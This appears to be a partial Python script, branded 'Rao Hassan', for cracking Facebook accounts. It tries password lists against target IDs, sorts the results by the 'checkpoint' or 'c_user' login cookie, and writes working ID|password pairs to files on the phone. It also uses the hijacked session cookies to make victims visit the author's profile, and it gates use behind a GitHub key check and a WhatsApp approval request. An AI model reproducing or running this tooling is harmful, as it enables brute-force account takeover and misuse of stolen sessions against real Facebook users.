...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r %s[ Rao Hassan ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m [ Rao Hassan-CP ] {idf} | {pw}')
...
def free(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;91m [ Rao Hassan-CP ] {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				...
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/Rao Hassan-OK.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
def follow(ses,coki):
	...
	r = sop(ses.get('https://www.facebook.com/HASSANALI6812?mibextid=ZbWKwL', cookies={'cookie': coki}).text, 'html.parser')
...
\033[1;32mNAM TO SUNA HOGA RAO HASSAN
\033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW
\033[;32mMAZA NA AYE PASSY WAPIS 😁🖕
        
 
••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
  \033[1;32mAuther     : RAO HASSAN
  \033[1;33mYouTube : RAO HASSAN
  \033[1;32mFecbook : RAO HASSAN
   \033[1;33m Admin.  : RAO HASSAN
••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;32m""")
...
class Main:
	def __init__(self):
		...
		print(logo)
		print("")
		print("\033[1;36m     GROUP SY LEFT KARNE WALON KA APROVEL URA DEYA JAIGA")
		print("")
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/Hassanali578/Hassan404/blob/main/Hassan.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
		...
		print(logo)
		print ("")
		print(" \033[1;32m Rao Hassan Toll Free BUT You Need Get Approved First\033[1;37m\n")
		print(" \033[1;32m Note : Rao Hassan FREE HA BHAIYO ENJOYA   \033[1;37m")
		print ("")
		...
		os.system('am start https://wa.me/+923266079620?text=' + tks)
		Subscraption()        
Subscraption()
